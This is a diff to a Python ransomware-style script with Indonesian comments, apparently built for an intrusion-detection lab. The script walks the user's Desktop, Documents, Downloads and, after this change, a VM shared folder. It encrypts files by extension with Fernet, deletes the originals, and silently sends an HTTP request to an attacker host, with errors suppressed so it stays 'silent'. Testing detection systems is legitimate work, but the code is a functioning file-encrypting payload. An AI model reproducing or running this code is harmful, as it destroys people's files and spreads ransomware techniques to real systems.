@@ -2,13 +2,14 @@ import os
 import tkinter as tk
 from tkinter import messagebox
 from cryptography.fernet import Fernet
-import requests  # Penting untuk trigger IDS
+import requests
 
-# Target direktori (Desktop, Documents, Downloads)
+# Daftar target direktori termasuk Shared Folder Windows
 TARGET_DIRS = [
     os.path.expanduser("~/Desktop"),
     os.path.expanduser("~/Documents"),
-    os.path.expanduser("~/Downloads")
+    os.path.expanduser("~/Downloads"),
+    os.path.expanduser("~/vmshare")
 ]
 
 # File ekstensi yang akan diproses
@@ -40,15 +41,14 @@ def encrypt_file(file_path, fernet, log_file):
         os.remove(file_path)
         log_file.write(f"Terenkripsi: {file_path} -> {new_path}\n")
     except Exception as e:
-        log_file.write(f"❌ Gagal: {file_path} | {e}\n")
+        log_file.write(f"Gagal: {file_path} | {e}\n")
 
-# Fungsi untuk trigger IDS dengan koneksi HTTP
+# Fungsi trigger IDS lewat koneksi HTTP (jika perlu)
 def notify_attacker():
     try:
-        # Ubah IP sesuai host attacker kamu
         requests.get("http://192.168.100.11:8080/attack", timeout=1)
     except:
-        pass  # Jangan munculkan error agar terlihat 'silent'
+        pass  # Jangan munculkan error agar tetap silent
 
 def encrypt_all():
     key = generate_key()
@@ -59,15 +59,17 @@ def encrypt_all():
         log_file.write("="*40 + "\n")
 
         for target_dir in TARGET_DIRS:
+            if not os.path.exists(target_dir):
+                log_file.write(f"[❌] Folder tidak ditemukan: {target_dir}\n")
+                continue
+
             for root, _, files in os.walk(target_dir):
                 for file in files:
                     if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                         full_path = os.path.join(root, file)
                         encrypt_file(full_path, fernet, log_file)
 
-    # Kirim sinyal ke IDS (biar terdeteksi)
     notify_attacker()
-
     messagebox.showinfo("Selesai", "File berhasil dienkripsi!\nLihat log di Desktop Anda.")
 
 # GUI
